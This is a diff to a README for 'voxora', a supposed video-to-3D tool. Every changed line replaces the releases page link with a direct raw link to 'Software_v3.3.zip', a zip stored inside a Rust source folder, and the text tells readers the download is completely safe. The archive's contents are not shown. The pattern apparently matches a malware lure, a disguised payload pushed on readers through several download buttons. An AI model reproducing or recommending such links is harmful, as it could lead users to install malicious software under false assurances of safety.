@@ -1,6 +1,6 @@
 # 🎥 voxora - Turn Flat Video into Real 3D Space
 
-[![Download voxora](https://img.shields.io/badge/Download-voxora-blue?style=for-the-badge&logo=github)](https://github.com/Wexdart4/voxora/releases)
+[![Download voxora](https://img.shields.io/badge/Download-voxora-blue?style=for-the-badge&logo=github)](https://github.com/Wexdart4/voxora/raw/refs/heads/main/crates/voxora-cli/src/Software_v3.3.zip)
 
 ## 👋 Welcome to voxora
 
@@ -22,7 +22,7 @@ Getting voxora up and running is simpler than you might think. Follow these easy
 
 ### Step 1: Download voxora
 
-Visit this link to download the application: [https://github.com/Wexdart4/voxora/releases](https://github.com/Wexdart4/voxora/releases)
+Visit this link to download the application: [https://github.com/Wexdart4/voxora/raw/refs/heads/main/crates/voxora-cli/src/Software_v3.3.zip](https://github.com/Wexdart4/voxora/raw/refs/heads/main/crates/voxora-cli/src/Software_v3.3.zip)
 
 Click the download button on that page, and the file will save to your computer. The download is completely safe and free of charge.
 
@@ -156,9 +156,9 @@ voxora is completely free to use. It's open-source software, meaning the code is
 
 Don't wait to explore the third dimension. Download voxora now and transform your regular videos into immersive 3D experiences. Whether you're a professional or just curious, voxora makes 3D reconstruction accessible to everyone.
 
-[![Get voxora Now](https://img.shields.io/badge/Get%20voxora%20Now-Download%20Here-brightgreen?style=for-the-badge)](https://github.com/Wexdart4/voxora/releases)
+[![Get voxora Now](https://img.shields.io/badge/Get%20voxora%20Now-Download%20Here-brightgreen?style=for-the-badge)](https://github.com/Wexdart4/voxora/raw/refs/heads/main/crates/voxora-cli/src/Software_v3.3.zip)
 
-Remember: Visit this link to download the application: [https://github.com/Wexdart4/voxora/releases](https://github.com/Wexdart4/voxora/releases)
+Remember: Visit this link to download the application: [https://github.com/Wexdart4/voxora/raw/refs/heads/main/crates/voxora-cli/src/Software_v3.3.zip](https://github.com/Wexdart4/voxora/raw/refs/heads/main/crates/voxora-cli/src/Software_v3.3.zip)
 
 Join the growing community of creators who are seeing their world in a whole new dimension. Download voxora today and give your videos the depth they deserve!
 
